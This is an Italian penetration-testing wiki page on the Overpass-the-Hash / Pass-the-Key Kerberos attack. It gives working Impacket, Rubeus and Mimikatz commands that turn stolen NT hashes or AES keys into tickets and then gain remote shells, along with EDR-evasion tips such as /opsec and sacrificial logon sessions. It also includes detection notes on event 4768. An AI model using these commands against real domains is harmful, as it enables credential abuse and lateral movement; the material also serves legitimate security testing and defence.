# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

L'attacco **Overpass The Hash/Pass The Key (PTK)** è progettato per gli ambienti in cui il protocollo NTLM tradizionale è limitato e l'autenticazione Kerberos ha la precedenza. Questo attacco sfrutta l'hash NTLM o le chiavi AES di un utente per richiedere ticket Kerberos, consentendo l'accesso non autorizzato alle risorse all'interno di una rete.

In senso stretto:

- **Over-Pass-the-Hash** indica solitamente la trasformazione dell'**hash NT** in un TGT Kerberos tramite la chiave Kerberos **RC4-HMAC**.
- **Pass-the-Key** è la variante più generica, in cui si dispone già di una chiave Kerberos come **AES128/AES256** e si richiede direttamente un TGT utilizzandola.

Questa differenza è importante negli ambienti sottoposti a hardening: se **RC4 è disabilitato** o non è più assunto dal KDC, il solo **hash NT non è sufficiente** ed è necessaria una **chiave AES** (oppure la password in chiaro da cui derivarla).

Per eseguire questo attacco, il passaggio iniziale consiste nell'acquisire l'hash NTLM o la password dell'account dell'utente preso di mira. Dopo aver ottenuto queste informazioni, è possibile ottenere un Ticket Granting Ticket (TGT) per l'account, consentendo all'attaccante di accedere ai servizi o alle macchine per i quali l'utente dispone delle autorizzazioni.

Il processo può essere avviato con i seguenti comandi:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Per gli scenari che richiedono AES256, è possibile utilizzare l'opzione `-aesKey [AES key]`:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` supporta anche la richiesta di un **service ticket direttamente tramite un AS-REQ** con `-service <SPN>`, utile quando vuoi un ticket per uno SPN specifico senza un ulteriore TGS-REQ:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Inoltre, il ticket ottenuto può essere utilizzato con vari tools, tra cui `smbexec.py` o `wmiexec.py`, ampliando la portata dell'attacco.

Problemi riscontrati come _PyAsn1Error_ o _KDC cannot find the name_ vengono generalmente risolti aggiornando la libreria Impacket o utilizzando l'hostname invece dell'indirizzo IP, garantendo la compatibilità con il Kerberos KDC.

Una sequenza di comandi alternativa che utilizza Rubeus.exe dimostra un altro aspetto di questa tecnica:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Questo metodo rispecchia l'approccio **Pass the Key**, concentrandosi sul prendere il controllo del ticket e utilizzarlo direttamente per l'autenticazione. In pratica:

- `Rubeus asktgt` invia autonomamente il **raw Kerberos AS-REQ/AS-REP** e non richiede diritti di amministratore, a meno che non si voglia indirizzare un'altra sessione di accesso con `/luid` o crearne una separata con `/createnetonly`.<sup>[[2]](#references)</sup>
- `mimikatz sekurlsa::pth` inserisce il materiale delle credenziali in una sessione di accesso e quindi interagisce con **LSASS**, richiedendo solitamente privilegi di amministratore locale o `SYSTEM` e risultando più rumoroso dal punto di vista di un EDR.

Esempi con Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Per conformarsi alla sicurezza operativa e utilizzare AES256, è possibile applicare il seguente comando:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` è rilevante perché il traffico generato da Rubeus differisce leggermente da quello del Kerberos nativo di Windows. Nota inoltre che `/opsec` è destinato al traffico **AES256**; utilizzarlo con RC4 richiede solitamente `/force`, vanificando gran parte dello scopo, perché **RC4 nei domini moderni è di per sé un forte indicatore**.

## Note sul rilevamento

Ogni richiesta TGT genera **l'evento `4768`** sul DC. Nelle build attuali di Windows, questo evento contiene più campi utili rispetto a quelli menzionati nei writeup più datati:

- `TicketEncryptionType` indica quale enctype è stato usato per il TGT emesso. I valori tipici sono `0x17` per **RC4-HMAC**, `0x11` per **AES128** e `0x12` per **AES256**.<sup>[[3]](#references)</sup>
- Gli eventi aggiornati espongono anche `SessionKeyEncryptionType`, `PreAuthEncryptionType` e gli enctypes annunciati dal client, aiutando a distinguere una **reale dipendenza da RC4** da impostazioni predefinite legacy fuorvianti.
- La presenza di `0x17` in un ambiente moderno è un buon indizio che l'account, l'host o il percorso di fallback del KDC consentano ancora RC4 e siano quindi più compatibili con Over-Pass-the-Hash basato su NT hash.

Microsoft ha progressivamente ridotto il comportamento predefinito basato su RC4 a partire dagli aggiornamenti di hardening di Kerberos del novembre 2022, e le linee guida pubblicate attualmente indicano di **rimuovere RC4 come enctype predefinito assunto per gli AD DC entro la fine del Q2 2026**. Dal punto di vista offensivo, ciò significa che **Pass-the-Key con AES** è sempre più il percorso affidabile, mentre il classico **OpTH basato esclusivamente su NT hash** continuerà a fallire più spesso negli ambienti sottoposti a hardening.<sup>[[3]](#references)</sup>

Per maggiori dettagli sui tipi di cifratura Kerberos e sui comportamenti correlati dei ticket, consulta:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Versione più furtiva

> [!WARNING]
> Ogni sessione di logon può avere un solo TGT attivo alla volta, quindi fai attenzione.

1. Crea una nuova sessione di logon con **`make_token`** da Cobalt Strike.
2. Quindi usa Rubeus per generare un TGT per la nuova sessione di logon senza influire su quella esistente.

Puoi ottenere un isolamento simile direttamente da Rubeus usando una sessione **logon type 9** sacrificale:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Questo evita di sovrascrivere il TGT della sessione corrente ed è generalmente più sicuro che importare il ticket nella sessione di logon esistente.

## Riferimenti

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (repository GitHub)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Rilevare e correggere l'uso di RC4 in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
